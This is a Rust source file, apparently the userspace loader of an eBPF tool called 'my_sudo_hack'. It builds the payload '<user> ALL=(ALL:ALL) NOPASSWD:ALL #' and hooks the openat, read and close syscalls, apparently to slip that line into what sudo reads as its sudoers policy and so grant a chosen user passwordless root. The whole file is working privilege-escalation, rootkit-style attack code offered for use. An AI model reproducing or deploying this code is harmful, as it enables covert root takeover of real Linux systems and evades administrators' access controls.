use aya::programs::TracePoint;
#[rustfmt::skip]
use log::{debug, warn};
use clap::Parser;
use my_sudo_hack_common::MAX_PAYLOAD_LEN;
use nix::unistd::User;
use tokio::signal;

const max_username_len: u64 = 20;

/// A simple CLI tool to restrict execution based on user and parent process ID
#[derive(Debug, Parser)]
#[command(
    name = "cli configuration",
    about = "A tool with user restriction options"
)]
struct Cli {
    /// Username of user
    #[arg(short = 'u', long = "username", value_name = "USERNAME")]
    username: Option<String>,

    /// Restrict to only run when sudo is executed by the matching user
    #[arg(
        short = 'r',
        long = "restrict",
        value_name = "RESTRICT",
        default_value_t = false
    )]
    restrict: bool,
}

fn lookup_user(name: &str) -> anyhow::Result<u32> {
    let user = User::from_name(name)?.expect("I don't know why your user name is None");
    Ok(user.uid.as_raw())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let opt = Cli::parse();
    let user_name = opt.username;
    if user_name.is_none() {
        println!("Please input target user name");
        return Ok(());
    }
    let user_name = user_name.unwrap();
    let uid = lookup_user(user_name.as_str())?;

    if user_name.len() as u64 > max_username_len {
        println!("the user name should be less than {}", MAX_PAYLOAD_LEN);
        return Ok(());
    }

    let magic_name = format!("{} ALL=(ALL:ALL) NOPASSWD:ALL #", user_name);

    env_logger::init();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.
    let mut payload: [u8; MAX_PAYLOAD_LEN] = [0; MAX_PAYLOAD_LEN];
    payload[..magic_name.len()].copy_from_slice(magic_name.as_bytes());

    let mut ebpf_loader = aya::EbpfLoader::new();

    if opt.restrict {
        ebpf_loader.set_global("uid", &uid, true);
    }

    let payload_len = magic_name.len() as u64;

    let mut ebpf = ebpf_loader
        .set_global("payload_len", &payload_len, true)
        .set_global("payload", &payload, true)
        .load(aya::include_bytes_aligned!(concat!(
            env!("OUT_DIR"),
            "/my_sudo_hack"
        )))?;

    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    println!("Waiting for Ctrl-C...");

    let sys_enter_openat_trace_point: &mut TracePoint = ebpf
        .program_mut("handle_openat_enter")
        .unwrap()
        .try_into()?;
    sys_enter_openat_trace_point.load()?;
    sys_enter_openat_trace_point.attach("syscalls", "sys_enter_openat")?;

    let app_trace_point: &mut TracePoint =
        ebpf.program_mut("handle_openat_exit").unwrap().try_into()?;
    app_trace_point.load()?;
    app_trace_point.attach("syscalls", "sys_exit_openat")?;

    let app_trace_point: &mut TracePoint =
        ebpf.program_mut("handle_read_enter").unwrap().try_into()?;
    app_trace_point.load()?;
    app_trace_point.attach("syscalls", "sys_enter_read")?;

    let app_trace_point: &mut TracePoint =
        ebpf.program_mut("handle_read_exit").unwrap().try_into()?;
    app_trace_point.load()?;
    app_trace_point.attach("syscalls", "sys_exit_read")?;

    let app_trace_point: &mut TracePoint =
        ebpf.program_mut("handle_close_exit").unwrap().try_into()?;
    app_trace_point.load()?;
    app_trace_point.attach("syscalls", "sys_exit_close")?;

    let ctrl_c = signal::ctrl_c();
    ctrl_c.await?;
    println!("Exiting...");

    Ok(())
}
